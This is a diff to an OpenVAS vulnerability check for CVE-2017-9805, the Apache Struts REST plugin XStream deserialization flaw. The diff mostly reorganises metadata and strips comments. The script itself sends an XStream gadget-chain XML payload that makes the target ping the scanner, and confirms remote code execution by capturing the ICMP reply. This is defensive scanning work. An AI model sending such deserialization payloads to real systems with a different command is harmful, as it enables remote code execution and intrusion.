@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apache_struts_rest_plug_xstream_rce_vuln.nasl 7336 2017-10-04 05:42:02Z asteins $
+# $Id: gb_apache_struts_rest_plug_xstream_rce_vuln.nasl 10317 2018-06-25 14:09:46Z cfischer $
 #
 # Apache Struts 'REST Plugin With XStream Handler' RCE Vulnerability
 #
@@ -27,18 +27,25 @@
 
 CPE = "cpe:/a:apache:struts";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.811730");
-  script_version("$Revision: 7336 $");
+  script_version("$Revision: 10317 $");
   script_cve_id("CVE-2017-9805");
   script_bugtraq_id(100609);
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-04 07:42:02 +0200 (Wed, 04 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-25 16:09:46 +0200 (Mon, 25 Jun 2018) $");
   script_tag(name:"creation_date", value:"2017-09-07 16:39:09 +0530 (Thu, 07 Sep 2017)");
-  script_tag(name:"qod_type", value:"exploit");
   script_name("Apache Struts 'REST Plugin With XStream Handler' RCE Vulnerability");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
+  script_dependencies("webmirror.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 8080);
+  script_exclude_keys("Settings/disable_cgi_scanning");
+
+  script_xref(name:"URL", value:"https://struts.apache.org/docs/s2-052.html");
 
   script_tag(name:"summary", value:"This host is running Apache Struts and is
   prone to remote code execution vulnerability.");
@@ -52,27 +59,20 @@ if (description)
 
   script_tag(name:"impact", value:"Successfully exploiting this issue may allow
   an attacker to execute arbitrary code in the context of the affected application.
-  Failed exploit attempts will likely result in denial-of-service conditions. 
+  Failed exploit attempts will likely result in denial-of-service conditions.
 
   Impact Level: System/Application");
 
   script_tag(name:"affected", value:"Apache Struts versions 2.5 through 2.5.12,
   2.1.2 through 2.3.33.");
 
-  script_tag(name: "solution" , value:"Upgrade to Apache Struts version 2.5.13
+  script_tag(name:"solution", value:"Upgrade to Apache Struts version 2.5.13
   or 2.3.34 or later. For updates refer to,
   http://struts.apache.org");
 
   script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"exploit");
 
-  script_xref(name : "URL" , value : "https://struts.apache.org/docs/s2-052.html");
-
-  script_category(ACT_ATTACK);
-  script_family("Web application abuses");
-  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
-  script_dependencies("webmirror.nasl", "os_detection.nasl");
-  script_require_ports("Services/www", 8080);
-  script_exclude_keys("Settings/disable_cgi_scanning");
   exit(0);
 }
 
@@ -80,17 +80,6 @@ include("http_func.inc");
 include("misc_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
-
-##Variable Initialization
-apachePort = "";
-soc = "";
-check = "";
-pattern = "";
-len = "";
-req = "";
-res = "";
-host = "";
-data = "";
 
 apachePort =  get_http_port( default:8080 );
 
@@ -105,36 +94,24 @@ if( jsps && is_array( jsps ) ) found = TRUE;
 
 if( ! found ) exit( 0 );
 
-## Open Socket
+host = http_host_name(port:apachePort);
+
 soc = open_sock_tcp(apachePort);
 if(!soc){
   exit(0);
 }
 
-##Check platform
-if(host_runs("Windows") == "yes")
-{
-  ## Construct command to be executed on Windows
+if(host_runs("Windows") == "yes"){
   COMMAND = '<string>ping</string><string>-n</string><string>3</string><string>'+ this_host() + '</string>';
   win = TRUE;
-}
-else
-{
+}else{
   ##For Linux and Unix platform
   check = "__OpenVAS__" + rand_str(length:4);
   pattern = hexstr(check);
-  ## Construct command to be executed on Linux/Unix
   COMMAND = '<string>ping</string><string>-c</string><string>3</string><string>-p</string><string>' + pattern + '</string><string>'+ this_host() + '</string>';
 }
 
-##Get Host Name
-host = http_host_name(port:apachePort);
-if(!host){
-  exit(0);
-}
-
-## Construct POSTDATA
-data = 
+data =
 '				<map>
 				<entry>
 				<jdk.nashorn.internal.objects.NativeString>
@@ -189,35 +166,27 @@ data =
 				<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
 				</entry>
 				</map>';
-				
-## POSTDATA Length
 len = strlen(data);
 if(!len){
   exit(0);
 }
 
-## Attack URL
 url = '/struts2-rest-showcase/orders/3';
-
-##Construct POST Request
 req = http_post_req( port: apachePort,
                      url: url,
                      data: data,
                      add_headers: make_array( 'Content-Type', 'application/xml'));
 
-##Send POST Req and Get response
 res = send_capture( socket:soc,
                     data:req,
                     timeout:2,
                     pcap_filter: string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
+close(soc);
 
-##Confirm Response
-if(res && (win || check >< res))
-{
+if(res && (win || check >< res)){
   report = "It was possible to execute command remotely at " + report_vuln_url( port:apachePort, url:url, url_only:TRUE ) + " with the command '" + COMMAND + "'.";
   security_message( port:apachePort, data:report);
-  close(soc);
   exit(0);
 }
-close(soc);
+
 exit(0);
